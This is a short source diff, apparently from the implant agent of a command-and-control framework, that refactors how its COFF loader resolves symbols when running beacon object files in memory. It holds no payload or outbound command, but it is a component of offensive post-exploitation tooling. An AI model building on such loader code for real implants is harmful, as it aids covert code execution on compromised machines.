@@ -213,22 +213,22 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
         AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
         AnsiString.Buffer        = SymName;
 
-        if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
-            goto SymbolNotFound;
-    }
-    else if ( SymbolType == SYMBOL_IS_A_FUNCTION)
-    {
-        // TODO: should we also fail if the symbol is not a function?
+        if ( NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
+            return TRUE;
+
         goto SymbolNotFound;
     }
-
-    // allow BOFs to reference the Instance struct
-    if ( HashStringA( SymbolName ) == COFF_INSTANCE )
+    else if ( HashStringA( SymbolName ) == COFF_INSTANCE )
     {
+        // allow BOFs to reference the Instance struct
         *pFuncAddr = &Instance;
+        return TRUE;
     }
-
-    return TRUE;
+    else if ( SymbolType != SYMBOL_IS_A_FUNCTION)
+    {
+        // TODO: should we also fail if the symbol is not a function?
+        return TRUE;
+    }
 
 SymbolNotFound:
     Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, Coffee->RequestID );
